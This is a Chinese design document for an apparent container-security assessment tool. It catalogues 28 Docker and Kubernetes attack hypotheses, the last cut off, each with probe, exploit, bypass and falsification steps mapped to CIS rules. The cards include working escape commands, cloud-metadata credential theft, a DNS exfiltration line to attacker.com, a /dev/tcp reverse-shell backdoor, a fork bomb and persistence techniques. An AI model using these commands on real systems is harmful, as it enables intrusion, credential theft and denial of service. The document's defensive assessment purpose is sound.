# 攻击假设库（Attack Hypotheses）

> 来源：设计文档 5.3 节"三库联动"
> 作用：每个攻击的前置条件、探测命令、验证步骤、绕过策略、证伪条件

## 假设卡片格式

每张卡片包含以下字段：

| 字段 | 说明 |
|------|------|
| 假设ID | `ATK-HYP-NNN`，连续编号 |
| 攻击面引用 | 攻击面ID 和名称 |
| 前置条件 | 满足攻击所需的环境证据（可被探测命令验证） |
| 探测命令 | 验证前置条件的只读命令，标注执行上下文 [L0]/[L1] |
| 攻击验证 | 证明攻击可利用的关键操作，标注 [L2]/[L3] |
| 差分证明 | 攻击前后可观测状态变化 |
| 绕过策略 | 防护被绕过的替代路径 |
| 证伪条件 | 满足则判定攻击不可利用 |
| 合规映射 | 关联的 CIS 规则编号 |
| 攻击模式文件 | attack-patterns 目录路径 |

---

## 假设卡片

### ATK-HYP-001：容器通过 docker.sock 逃逸

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-001 |
| 攻击面引用 | AS-1 逃逸（socket-escape） |
| 前置条件 | 容器内可见 `/var/run/docker.sock` 且有读写权限 |
| 探测命令 | [L0] `kubectl get pods -A -o jsonpath='{.items[*].spec.volumes[*].hostPath}' | grep docker.sock`；[L1] `ls -la /var/run/docker.sock` |
| 攻击验证 | [L2] `docker run -v /:/hostfs alpine chroot /hostfs id` 返回 uid=0(root) |
| 差分证明 | 攻击前 [L0]: docker ps 无异常容器；攻击后 [L0]: docker ps 出现新建 alpine 容器；攻击前 [L1]: 容器内无法读取宿主机 /etc/shadow；攻击后 [L2]: 容器内可通过 docker.sock 读取宿主机 /etc/shadow |
| 绕过策略 | 若 docker.sock 仅可读，尝试 `docker logs` 泄露环境变量；若 docker.sock 不在默认路径，搜索 `find / -name docker.sock 2>/dev/null` |
| 证伪条件 | docker.sock 不存在；或存在但无读写权限（Permission denied）；Seccomp 阻止 docker socket 相关 syscall |
| 合规映射 | K8s-7.1.1 |
| 攻击模式文件 | `attack-patterns/escape/socket-escape/SKILL.md` |

### ATK-HYP-002：hostPath 挂载宿主机根目录逃逸

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-002 |
| 攻击面引用 | AS-1 逃逸（hostpath-mount） |
| 前置条件 | Pod 挂载 hostPath 卷指向敏感路径（/、/etc、/var/run 等） |
| 探测命令 | [L0] `kubectl get pods -A -o json | jq '.items[] | select(.spec.volumes[]?.hostPath) | {name: .metadata.name, volumes: [.spec.volumes[] | select(.hostPath) | {name, path: .hostPath.path}]}'`；[L1] `mount | grep -E 'hostPath|/mnt/host'` |
| 攻击验证 | [L2] 对挂载了宿主机 `/` 的 Pod：`cat /mnt/host/etc/shadow` 返回 shadow 文件内容；[L2] `echo 'malicious' >> /mnt/host/etc/cron.d/backdoor` 写入持久化 |
| 差分证明 | 攻击前 [L1]: 容器内无法访问宿主机文件系统；攻击后 [L2]: 可读写宿主机关键文件 |
| 绕过策略 | 若 hostPath 为只读挂载，仍可读取敏感数据（/etc/shadow、SSH 密钥）；若路径为子目录，尝试符号链接跳出 |
| 证伪条件 | 无 hostPath 挂载；或 hostPath 路径为无关路径（如 /tmp/data）且无可读敏感文件 |
| 合规映射 | K8s-7.1.2 |
| 攻击模式文件 | `attack-patterns/escape/hostpath-mount/SKILL.md` |

### ATK-HYP-003：特权容器通过 CAP_SYS_ADMIN 逃逸

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-003 |
| 攻击面引用 | AS-1 逃逸（capability-privesc） |
| 前置条件 | 容器拥有 CAP_SYS_ADMIN 或其他危险 capability（SYS_PTRACE、SYS_MODULE、NET_ADMIN） |
| 探测命令 | [L0] `kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].securityContext.capabilities.add}'`；[L1] `cat /proc/self/status | grep CapEff` |
| 攻击验证 | [L2] CAP_SYS_ADMIN 容器：`mount /dev/sda1 /mnt && cat /mnt/etc/shadow`；[L2] CAP_SYS_MODULE：`insmod malicious.ko` 加载内核模块 |
| 差分证明 | 攻击前 [L1]: 有效 capabilities 受限；攻击后 [L2]: 可执行挂载、mount 等特权操作 |
| 绕过策略 | CAP_NET_ADMIN 可用于修改路由表/iptables 实现中间人；CAP_SYS_PTRACE 可注入宿主机进程 |
| 证伪条件 | Capabilities 已 drop ALL 且仅 add 最小必要集合；Seccomp 阻止特权 syscall；AppArmor 限制 mount 操作 |
| 合规映射 | K8s-7.1.6, K8s-7.1.12 |
| 攻击模式文件 | `attack-patterns/escape/capability-privesc/SKILL.md` |

### ATK-HYP-004：cgroup 逃逸

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-004 |
| 攻击面引用 | AS-1 逃逸（cgroup-escape） |
| 前置条件 | 容器拥有 CAP_SYS_ADMIN；或 cgroup 可写 + 内核版本存在漏洞窗口（< 5.x） |
| 探测命令 | [L0] `kubectl get pods -A -o jsonpath='{.items[*].spec.securityContext.privileged}'`；[L1] `cat /proc/self/status | grep CapEff`；[L1] `ls -la /sys/fs/cgroup/` |
| 攻击验证 | [L2] 向 cgroup release_notification 写入宿主机命令：`echo 1 > /sys/fs/cgroup/zyx/notify_on_release && echo "/tmp/cgcmd" > /sys/fs/cgroup/zyx/release_agent` |
| 差分证明 | 攻击前 [L0]: 宿主机无异常进程；攻击后 [L0]: 宿主机 /tmp 下出现逃逸脚本执行痕迹 |
| 绕过策略 | 若无 CAP_SYS_ADMIN，检查 cgroup v1 是否可写（docker 默认 cgroup namespace 隔离不完全）；检查 AppArmor/Seccomp 是否限制 release_agent |
| 证伪条件 | 无 CAP_SYS_ADMIN 且 cgroup 只读挂载；Seccomp 阻止相关 syscall；AppArmor 阻止 cgroup 写入 |
| 合规映射 | K8s-7.1.1, K8s-7.1.6 |
| 攻击模式文件 | `attack-patterns/escape/cgroup-escape/SKILL.md` |

### ATK-HYP-005：K8s 匿名 API 访问

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-005 |
| 攻击面引用 | AS-2 认证授权（k8s-anonymous-access） |
| 前置条件 | API Server 匿名认证启用（默认行为）或 Kubelet 匿名访问启用 |
| 探测命令 | [L0] `ps -ef | grep kube-apiserver | grep -oE '--anonymous-auth=[^ ]*'`；[L0] `curl -k https://<api-server>:6443/api` 无需认证返回 200 |
| 攻击验证 | [L2] `kubectl --server=https://<api-server>:6443 --insecure-skip-tls-verify=true get nodes` 返回节点列表；[L2] `curl -k https://<node>:10250/pods` 返回 Pod 列表 |
| 差分证明 | 攻击前: 无法从外部访问 API Server；攻击后: 匿名请求可列出集群资源 |
| 绕过策略 | 若 API Server 匿名被禁但 Kubelet 仍允许匿名，尝试直接访问 Kubelet 10250 端口；尝试 Service Account 代替匿名 |
| 证伪条件 | API Server `--anonymous-auth=false`；Kubelet `--anonymous-auth=false`；NetworkPolicy 阻止外部访问 |
| 合规映射 | K8s-1.2.1 |
| 攻击模式文件 | `attack-patterns/auth/k8s-anonymous-access/SKILL.md` |

### ATK-HYP-006：RBAC 权限提升

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-006 |
| 攻击面引用 | AS-2 认证授权（k8s-rbac-abuse） |
| 前置条件 | 当前 SA 拥有超过必要权限的 RBAC 绑定（如 create pods、create secrets、list secrets、impersonate） |
| 探测命令 | [L0] `kubectl auth can-i --list 2>/dev/null | grep -E 'create|delete|list'`；[L0] `kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name=="cluster-admin")'` |
| 攻击验证 | [L2] `kubectl create pod --image=alpine --serviceaccount=<当前SA>` 成功创建特权 Pod；[L2] `kubectl get secrets -n kube-system` 返回 Secret 列表 |
| 差分证明 | 攻击前: SA 无法创建 Pod 读取 Secret；攻击后: SA 可创建 Pod 和读取 Secret |
| 绕过策略 | 若无法直接创建 pod，尝试 `kubectl create rolebinding` 自行提权；若只能 list secrets，尝试读取 default token |
| 证伪条件 | `kubectl auth can-i` 对所有敏感动词返回 no；当前 SA 仅在受限命名空间有权限；RBAC 已遵循最小权限 |
| 合规映射 | K8s-8.2.1, K8s-8.2.2, K8s-8.2.3 |
| 攻击模式文件 | `attack-patterns/auth/k8s-rbac-abuse/SKILL.md` |

### ATK-HYP-007：ServiceAccount token 滥用

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-007 |
| 攻击面引用 | AS-2 认证授权（k8s-sa-exploit） |
| 前置条件 | default SA 未禁用 automountServiceAccountToken；或业务 SA 权限过宽 |
| 探测命令 | [L0] `kubectl get pods -A -o jsonpath='{.items[*].spec.serviceAccountName}'` 显示大量 default；[L1] `cat /var/run/secrets/kubernetes.io/serviceaccount/token` |
| 攻击验证 | [L2] 用获取的 token：`curl -k -H "Authorization: Bearer <token>" https://<api-server>:6443/api/v1/namespaces/default/secrets` 返回 Secret 列表 |
| 差分证明 | 攻击前: 无法通过 curl 访问 API；攻击后: 使用 SA token 可列出/读取集群资源 |
| 绕过策略 | 若 default SA 权限有限，尝试找出其他 SA 的 token（如 kube-system 下的 SA）；利用 `kubectl auth can-i --list` 枚举权限 |
| 证伪条件 | automountServiceAccountToken: false 在所有业务 Pod 上；default SA 无权限；自定义 SA 权限最小化 |
| 合规映射 | K8s-7.1.14, K8s-8.2.4, K8s-8.2.5 |
| 攻击模式文件 | `attack-patterns/auth/k8s-sa-exploit/SKILL.md` |

### ATK-HYP-008：网络横向移动

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-008 |
| 攻击面引用 | AS-3 网络（lateral-move） |
| 前置条件 | 命名空间无 NetworkPolicy；Pod 间全互通 |
| 探测命令 | [L0] `kubectl get networkpolicy -A` 显示命名空间缺失 NetworkPolicy；[L1] `curl -s http://<otherPodIP>:<port>` 可访问其他命名空间 Pod |
| 攻击验证 | [L2] 从被入侵容器 curl 扫描其他命名空间 Service/Pod；[L2] `curl http://<redis-svc>:6379 INFO` 获取其他服务信息 |
| 差分证明 | 攻击前: 仅可访问本命名空间服务；攻击后: 可跨命名空间访问数据库、API 等内部服务 |
| 绕过策略 | 若命名空间有部分 NetworkPolicy，尝试利用允许的 DNS 或特定端口进行数据外发；利用 kube-dns 枚举服务名 |
| 证伪条件 | 所有命名空间配置了 default-deny NetworkPolicy；CNI 支持且启用了网络隔离；跨命名空间访问被拒绝 |
| 合规映射 | K8s-8.2.10 |
| 攻击模式文件 | `attack-patterns/network/lateral-move/SKILL.md` |

### ATK-HYP-009：云元数据窃取

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-009 |
| 攻击面引用 | AS-3 网络（cloud-metadata） |
| 前置条件 | 容器可访问云元数据端点（169.254.169.254），无 NetworkPolicy 阻断 |
| 探测命令 | [L1] `curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/` 返回 200 |
| 攻击验证 | [L2] AWS: `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/` 获取 IAM 临时凭证；GCP: `curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/` 获取 token |
| 差分证明 | 攻击前: 无云凭据；攻击后: 持有可用的 IAM/服务帐号临时凭据，可操作云资源 |
| 绕过策略 | 若 169.254.169.254 被 iptables 阻断，尝试 IPv6 等价端点（如 `[fd00:ec2::254]`）；尝试不同云厂商的路径前缀 |
| 证伪条件 | 连接超时；返回 403/被 NetworkPolicy 阻断；iptables 规则已阻断 169.254.169.254 |
| 合规映射 | K8s-8.2.10 |
| 攻击模式文件 | `attack-patterns/network/cloud-metadata/SKILL.md` |

### ATK-HYP-010：DNS 数据外发

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-010 |
| 攻击面引用 | AS-3 网络（dns-exfil） |
| 前置条件 | 容器可解析外部域名，无 Egress NetworkPolicy 限制 DNS 出站 |
| 探测命令 | [L1] `nslookup external-domain.com` 解析成功；[L1] `cat /etc/resolv.conf` 显示集群 DNS 配置 |
| 攻击验证 | [L2] 将数据编码为 DNS 查询：`dig $(echo "secret_data" | base64).attacker.com` 外发数据 |
| 差分证明 | 攻击前: 无外部 DNS 查询；攻击后: DNS 查询日志中出现异常域名解析请求 |
| 绕过策略 | 若长 DNS 查询被截断，分块外发；若特定域名被封，使用 DNS over HTTPS；利用 `nslookup` 代替 `dig` |
| 证伪条件 | Egress NetworkPolicy 阻断外部 DNS 解析；集群 DNS 仅解析内部域名；iptables 规则限制 DNS 出站 |
| 合规映射 | K8s-8.2.10 |
| 攻击模式文件 | `attack-patterns/network/dns-exfil/SKILL.md` |

### ATK-HYP-011：Secret 明文泄露

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-011 |
| 攻击面引用 | AS-4 数据泄露（secret-exfil） |
| 前置条件 | K8s Secret 以环境变量挂载到 Pod；或 SA token 可读取 Secret |
| 探测命令 | [L0] `kubectl get pods -A -o json | jq '.items[].spec.containers[].env[] | select(.valueFrom.secretKeyRef)'` 显示环境变量引用 Secret；[L1] `env | grep -iE 'password|secret|token|key|credential'` |
| 攻击验证 | [L2] 环境变量中的密码/凭据可成功连接目标服务：`mysql -h$db_host -u$db_user -p$db_pass` 连接成功 |
| 差分证明 | 攻击前: 无法获取数据库密码；攻击后: 可使用泄露的凭据连接数据库 |
| 绕过策略 | 若 `env` 命令被限制，尝试 `/proc/self/environ`；若凭据是 base64 编码（K8s Secret 默认），直接 base64 解码 |
| 证伪条件 | Secret 以文件挂载而非环境变量；环境变量中无敏感信息；发现的关键格式不正确或已过期 |
| 合规映射 | K8s-8.3.1（G_8_3） |
| 攻击模式文件 | `attack-patterns/data/secret-exfil/SKILL.md` |

### ATK-HYP-012：环境变量凭据泄露

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-012 |
| 攻击面引用 | AS-4 数据泄露（env-credential-leak） |
| 前置条件 | 容器环境变量中包含数据库密码、API key 等敏感信息 |
| 探测命令 | [L1] `env | grep -iE 'password|secret|token|key|credential|aws_access|mysql|postgres'`；[L1] `cat /proc/self/environ | tr '\0' '\n'` |
| 攻击验证 | [L2] 提取到的凭据可成功连接对应服务：`psql "$DATABASE_URL"` 或 `aws s3 ls --profile extracted` |
| 差分证明 | 攻击前: 无数据库/云服务凭据；攻击后: 可用泄露凭据访问目标服务 |
| 绕过策略 | 若 `env` 被 AppArmor 限制，尝试 `/proc/*/environ` 读取其他进程环境；若凭据为 base64 编码，解码验证 |
| 证伪条件 | 环境变量中无敏感信息；发现的 key 格式不正确或已过期；AppArmor 阻止环境变量读取 |
| 合规映射 | Docker G_5, K8s-8.3.1 |
| 攻击模式文件 | `attack-patterns/data/env-credential-leak/SKILL.md` |

### ATK-HYP-013：资源滥用 DoS

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-013 |
| 攻击面引用 | AS-5 拒绝服务（resource-abuse） |
| 前置条件 | Pod 无 resources.limits；命名空间无 ResourceQuota |
| 探测命令 | [L0] `kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].resources.limits}'` 显示空值；[L0] `kubectl get resourcequota -A` 返回空 |
| 攻击验证 | [L3] 条件验证：无资源限制 + 无 ResourceQuota = 理论可耗尽节点资源（CPU/内存/PID），P(确认) = HIGH |
| 差分证明 | 攻击前: 节点资源使用率正常；攻击后: 单 Pod 可耗尽节点 CPU/内存导致其他 Pod 被驱逐 |
| 绕过策略 | 若有 LimitRange 但无 ResourceQuota，仍可通过创建大量小资源 Pod 耗尽配额 |
| 证伪条件 | 所有命名空间配置 ResourceQuota；所有 Pod 设置 resources.limits；LimitRange 强制最小资源请求 |
| 合规映射 | K8s-8.2.9 |
| 攻击模式文件 | `attack-patterns/dos/resource-abuse/SKILL.md` |

### ATK-HYP-014：Fork 炸弹

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-014 |
| 攻击面引用 | AS-5 拒绝服务（fork-bomb） |
| 前置条件 | 容器无 PID 限制（PidsLimit=0 或 -1）；特权容器或容器可执行 fork 操作 |
| 探测命令 | [L0] `docker inspect --format '{{.HostConfig.PidsLimit}}' <cid>` 返回 0；[L0] `kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].resources.limits.pid}'` 为空 |
| 攻击验证 | [L3] 条件验证：无 PID 限制 = fork bomb 可行。不实际执行：`:(){ :|:& };:` 会影响生产环境 |
| 差分证明 | 攻击前: 容器进程数正常（几十个）；攻击后: 进程数飙升至上万，节点 PID 耗尽 |
| 绕过策略 | 若 PidsLimit 设置但值过大（如 65536），仍可创建大量进程耗尽 cgroup PID 预算 |
| 证伪条件 | PidsLimit 设置为合理值（如 100-200）；Seccomp 阻止 fork；ulimit 限制 nproc；AppArmor 限制进程创建 |
| 合规映射 | Docker-41, K8s-8.2.9 |
| 攻击模式文件 | `attack-patterns/dos/fork-bomb/SKILL.md` |

### ATK-HYP-015：镜像标签篡改

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-015 |
| 攻击面引用 | AS-6 供应链（image-tag-mutation） |
| 前置条件 | 容器镜像使用 `:latest` 标签或无摘要；未启用 Docker Content Trust |
| 探测命令 | [L0] `kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' | grep ':latest'`；[L1] `echo $DOCKER_CONTENT_TRUST` 为空 |
| 攻击验证 | [L2] 攻击者推送同名不同内容的镜像到 registry，K8s 拉取了被篡改的镜像；[L2] `docker pull <image>:latest` 两次摘要不同 |
| 差分证明 | 攻击前: `sha256:abc123`；攻击后: 同一标签指向 `sha256:xyz789`；镜像内容被篡改 |
| 绕过策略 | 若镜像有签名但验证不严格，尝试中间人攻击 registry；若 private registry 无认证，直接推送篡改镜像 |
| 证伪条件 | 所有镜像使用摘要（sha256）引用；DOCKER_CONTENT_TRUST=1 启用；镜像签名验证配置正确 |
| 合规映射 | Docker-51 |
| 攻击模式文件 | `attack-patterns/supply/image-tag-mutation/SKILL.md` |

### ATK-HYP-016：仓库投毒

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-016 |
| 攻击面引用 | AS-6 供应链（registry-poison） |
| 前置条件 | 镜像仓库无认证或认证弱；使用公共镜像（如 Docker Hub）且无签名验证 |
| 探测命令 | [L0] `docker login <registry> -u test -p test` 可登录；[L0] `curl -s https://<registry>/v2/_catalog` 返回仓库列表 |
| 攻击验证 | [L2] 向未保护仓库推送同名恶意镜像：`docker tag alpine <registry>/app/alpine:latest && docker push <registry>/app/alpine:latest` |
| 差分证明 | 攻击前: 仓库镜像列表正常；攻击后: 仓库出现同名但被篡改的镜像 |
| 绕过策略 | 若仓库有认证但使用弱密码，尝试暴力破解；若仓库有 TLS 但证书验证不严，尝试中间人 |
| 证伪条件 | 镜像仓库启用强认证；所有推 pull 操作使用 TLS 和签名验证；NetworkPolicy 限制仓库访问 |
| 合规映射 | Docker G_2, Docker-51 |
| 攻击模式文件 | `attack-patterns/supply/registry-poison/SKILL.md` |

### ATK-HYP-017：Webhook 后门持久化

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-017 |
| 攻击面引用 | AS-7 持久化（webhook-backdoor） |
| 前置条件 | 攻击者有创建/修改 MutatingWebhookConfiguration 或 ValidatingWebhookConfiguration 的权限 |
| 探测命令 | [L0] `kubectl get validatingwebhookconfiguration,mutatingwebhookconfiguration -A` 列出现有 Webhook；[L0] `kubectl auth can-i create mutatingwebhookconfigurations` |
| 攻击验证 | [L2] 创建恶意 Webhook 将所有 Pod 的 image 改为攻击者控制镜像：`kubectl apply -f malicious-webhook.yaml` |
| 差分证明 | 攻击前: 新创建的 Pod 使用预期镜像；攻击后: 新创建的 Pod 镜像被替换为攻击者控制镜像 |
| 绕过策略 | 若仅有 ValidatingWebhook 权限，创建拒绝特定标签 Pod 的 Webhook 实现拒绝服务；若 Webhook 端点有 TLS，尝试使用自签证书 |
| 证伪条件 | RBAC 限制 Webhook 创建权限；准入控制器阻止可疑 Webhook 注册；Webhook 使用 CABundle 验证 |
| 合规映射 | K8s-1.2.x, K8s-8.2.2 |
| 攻击模式文件 | `attack-patterns/persist/webhook-backdoor/SKILL.md` |

### ATK-HYP-018：CronJob 持久化

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-018 |
| 攻击面引用 | AS-7 持久化（cronjob-persist） |
| 前置条件 | 当前 SA 拥有 `batch/cronjobs` 创建权限 |
| 探测命令 | [L0] `kubectl auth can-i create cronjobs --as=system:serviceaccount:<ns>:<sa>`；[L0] `kubectl auth can-i create cronjobs -n <ns>` |
| 攻击验证 | [L2] `kubectl create cronjob malicious --image=alpine --schedule="*/5 * * * *" --restart=OnFailure -- sleep 3600` 创建持久化 CronJob |
| 差分证明 | 攻击前: 命名空间无恶意 CronJob；攻击后: 每 5 分钟执行一个 alpine 容器 |
| 绕过策略 | 若仅能创建 Job 而非 CronJob，手动创建重复 Job 实现持久化；利用 `ttlSecondsAfterFinished=0` 覆盖痕迹 |
| 证伪条件 | RBAC 限制 CronJob 创建权限；准入控制器只允许特定镜像名的 CronJob；命名空间有 ResourceQuota 限制 Job 数量 |
| 合规映射 | K8s-8.2.2, K8s-8.2.6 |
| 攻击模式文件 | `attack-patterns/persist/cronjob-persist/SKILL.md` |

### ATK-HYP-019：Docker Volume 持久化

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-019 |
| 攻击面引用 | AS-7 持久化（docker-volume-persist） |
| 前置条件 | Docker 容器挂载了可写 volume 到宿主机路径 |
| 探测命令 | [L0] `docker inspect --format '{{range .Mounts}}{{.Source}} -> {{.Destination}} ({{.RW}}){{println}}{{end}}' <cid>`；[L1] `ls -la /data` 查看可写挂载目录 |
| 攻击验证 | [L2] 在可写 volume 中植入后门脚本：`echo '#!/bin/sh\n/bin/bash -i >& /dev/tcp/attacker/4444 0>&1' > /data/startup.sh` |
| 差分证明 | 攻击前: volume 中无恶意文件；攻击后: volume 中存在后门脚本，容器重启后可能自动执行 |
| 绕过策略 | 若 volume 有写保护但目录权限宽松，覆盖已有配置文件；利用 .bashrc / .profile 注入；写入 crontab 文件 |
| 证伪条件 | Volume 挂载为只读（:ro）；宿主机目录权限严格；无自动执行入口 |
| 合规映射 | Docker-50 |
| 攻击模式文件 | `attack-patterns/persist/docker-volume-persist/SKILL.md` |

### ATK-HYP-020：Docker API 未认证访问

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-020 |
| 攻击面引用 | AS-2 认证授权（docker-api-auth） |
| 前置条件 | Docker daemon 监听 TCP 端口（2375/2376）且无 TLS 或弱认证 |
| 探测命令 | [L0] `ps -ef | grep dockerd | grep -E '2375|2376|tcp://'`；[L0] `curl -s http://<host>:2375/info | head -20` 返回 Docker 信息 |
| 攻击验证 | [L2] `docker -H tcp://<host>:2375 run -v /:/hostfs alpine chroot /hostfs id` 远程逃逸 |
| 差分证明 | 攻击前: 仅本地可管理 Docker；攻击后: 远程可创建容器、拉取镜像、管理容器生命周期 |
| 绕过策略 | 若 2376 需要 TLS 但证书自签，尝试忽略证书验证；若端口被防火墙阻挡但可从容器内部网络访问 |
| 证伪条件 | Docker daemon 不监听 TCP 端口；仅监听 Unix socket；TLS 配置正确且强制客户端证书认证 |
| 合规映射 | Docker-G_2 |
| 攻击模式文件 | `attack-patterns/auth/docker-api-auth/SKILL.md` |

### ATK-HYP-021：procfs 逃逸

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-021 |
| 攻击面引用 | AS-1 逃逸（procfs-escape） |
| 前置条件 | /proc 以读写模式挂载到容器；或特权容器可访问 /proc/sys 内核参数 |
| 探测命令 | [L1] `mount | grep "proc"` 显示 rw；[L1] `ls -la /proc/sys/kernel/` |
| 攻击验证 | [L2] 通过 /proc 写入修改内核参数或利用 /proc/1/root 路径跳转至宿主机文件系统 |
| 差分证明 | 攻击前: 容器内无法访问宿主机根文件系统；攻击后: 可通过 /proc/1/root 读取/写入宿主机文件 |
| 绕过策略 | 若 /proc 为只读，检查是否有子目录可写（如 /proc/sys）；利用 /proc/self/cwd 符号链接进行路径遍历 |
| 证伪条件 | /proc 以只读模式挂载；Seccomp 阻止 write 系统调用对 /proc 的操作；AppArmor 限制 procfs 访问 |
| 合规映射 | K8s-7.1.2, K8s-7.1.9 |
| 攻击模式文件 | `attack-patterns/escape/procfs-escape/SKILL.md` |

### ATK-HYP-022：Kubelet 未认证访问

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-022 |
| 攻击面引用 | AS-2 认证授权（k8s-anonymous-access） |
| 前置条件 | Kubelet 匿名访问启用（`--anonymous-auth=true` 或默认值）；Kubelet 端口（10250/10255）可达 |
| 探测命令 | [L0] `ps -ef | grep kubelet | grep -oE '--anonymous-auth=[^ ]*'`；[L0] `curl -sk https://<node>:10250/pods` 返回 Pod 列表 |
| 攻击验证 | [L2] `curl -sk https://<node>:10250/exec/<namespace>/<pod>/<container>?command=cat&command=/etc/shadow` 在容器内执行命令 |
| 差分证明 | 攻击前: 未认证请求被拒绝；攻击后: 匿名请求可列出 Pod 并执行命令 |
| 绕过策略 | 若 10250 端口需要认证但 10255（只读）开放，通过只读端口获取信息；利用 Kubelet 的 pprof 端点进行信息收集 |
| 证伪条件 | Kubelet `--anonymous-auth=false`；Kubelet 需要 Webhook 认证；NetworkPolicy 阻止非本机访问 10250 |
| 合规映射 | K8s G_4_kubelet 组 |
| 攻击模式文件 | `attack-patterns/auth/k8s-anonymous-access/SKILL.md` |

### ATK-HYP-023：镜像层敏感信息泄露

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-023 |
| 攻击面引用 | AS-4 数据泄露（image-layer-secret） |
| 前置条件 | 镜像构建历史中包含 ENV/COPY 的密码、密钥等敏感信息 |
| 探测命令 | [L0] `docker history --no-trunc <image> 2>/dev/null | grep -iE 'password|secret|key|token'`；[L0] `docker save <image> -o /tmp/img.tar && tar -xf /tmp/img.tar && grep -r 'password' <layer>/` |
| 攻击验证 | [L2] 从镜像层中提取凭据：`docker run --rm <image> sh -c 'env | grep -i pass'` 或检查历史层中的配置文件 |
| 差分证明 | 攻击前: 无法获取镜像历史中的凭据；攻击后: 可从镜像层提取明文密码/密钥 |
| 绕过策略 | 若镜像是多阶段构建，检查中间层；利用 `docker diff` 查看文件系统变化；使用工具如 dive 深度分析镜像 |
| 证伪条件 | 镜像构建使用多阶段构建且不在最终层保留敏感信息；ENV 变量不含密码；.dockerignore 排除了敏感文件 |
| 合规映射 | Docker G_4 |
| 攻击模式文件 | `attack-patterns/data/image-layer-secret/SKILL.md` |

### ATK-HYP-024：containerd-shim 逃逸

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-024 |
| 攻击面引用 | AS-1 逃逸（containerd-shim-escape） |
| 前置条件 | 使用 containerd 运行时；containerd-shim socket 可访问；shim 版本存在已知漏洞 |
| 探测命令 | [L0] `crictl info | grep -i containerd` 确认运行时；[L1] `ls -la /run/containerd/ | grep shim` |
| 攻击验证 | [L3] 条件验证：containerd-shim socket 可访问 + shim 版本存在漏洞（如 CVE-2024-32498）= 理论逃逸可行 |
| 差分证明 | 攻击前: 容器进程与宿主机隔离；攻击后: 通过 shim 漏洞在宿主机执行代码 |
| 绕过策略 | 若默认 socket 路径不可访问，搜索其他路径；利用 containerd API 的设计缺陷 |
| 证伪条件 | containerd-shim socket 权限正确（仅 root 可访问）；shim 版本已修补已知漏洞；AppArmor 阻止 shim socket 访问 |
| 合规映射 | Containerd G_1（运行环境配置） |
| 攻击模式文件 | `attack-patterns/escape/containerd-shim-escape/SKILL.md` |

### ATK-HYP-025：共享 PID namespace 进程注入

| 字段 | 值 |
|------|-----|
| 假设ID | ATK-HYP-025 |
| 攻击面引用 | AS-1 逃逸（capability-privesc） |
| 前置条件 | Pod 设置 hostPID: true；或同一 Pod 内多个容器共享 PID namespace |
| 探测命令 | [L0] `kubectl get pods -A -o jsonpath='{.items[*].spec.hostPID}'`; [L1] `ps aux | grep kubelet` 可见宿主机进程 |
| 攻击验证 | [L2] `kill -9 <kubelet_pid>` 可杀死宿主机进程；[L2] `strace -p <pid>` 追踪宿主机进程 |
| 差分证明 | 攻击前: 容器内仅可见自身进程；攻击后: 可观察/操作宿主机所有进程 |
| 绕过策略 | 若 kill 被阻止，尝试 ptrace 注入代码；若仅可观察，利用进程信息辅助其他逃逸路径 |
| 证伪条件 | hostPID 未设置；Seccomp 阻止 ptrace/kill 系统调用；AppArmor 限制进程观察 |
| 合规映射 | K8s-7.1.3 |
| 攻击模式文件 | `attack-patterns/escape/capability-privesc/SKILL.md` |

### ATK-HYP-026：K8s exec 权限滥用

- **攻击面引用**: AS-2.5 认证授权（k8s-exec-abuse）
- **前置条件**: SA或用户拥有pods/exec权限
- **探测命令**: [L0] kubectl auth can-i create pods/exec
- **攻击验证**: [L2] kubectl exec <target-pod> -- cat /etc/shadow
- **差分证明**: [L0]攻击前Pod文件 vs [L2]exec后读取文件
- **绕过策略**: audit policy记录exec操作
- **证伪条件**: 无pods/exec权限
- **合规映射**: K8s-8.2.x（RBAC配置）+ exec权限
- **攻击模式文件**: `attack-patterns/auth/k8s-exec-abuse/SKILL.md`

### ATK-HYP-027：K8s Node Proxy/Port-Forward 滥用

- **攻击面引用**: AS-3.5 网络（k8s-proxy-abuse）
- **前置条件**: SA或用户拥有pods/portforward或proxy权限
- **探测命令**: [L0] kubectl auth can-i create pods/portforward
- **攻击验证**: [L2] kubectl port-forward <pod> 8080:80
- **差分证明**: [L0]攻击前端口 vs [L2]port-forward后可访问内部服务
- **绕过策略**: NetworkPolicy限制port-forward目标
- **证伪条件**: 无portforward/proxy权限
- **合规映射**: K8s-8.2.x（RBAC配置）+ K8s-6.x（网络策略）
- **攻击模式文件**: `attack-patterns/network/k8s-proxy-abuse/SKILL.md`

### ATK-HYP-028：containerd ctr 工具滥用

- **攻击面引用**: AS-2.4 认证授权（ctr-tool-abuse）
- **前置条件**: ctr工具可用且containerd socket可访问
- **探测命令**: [L0] which ctr && ls -la /run/containerd/containerd.sock
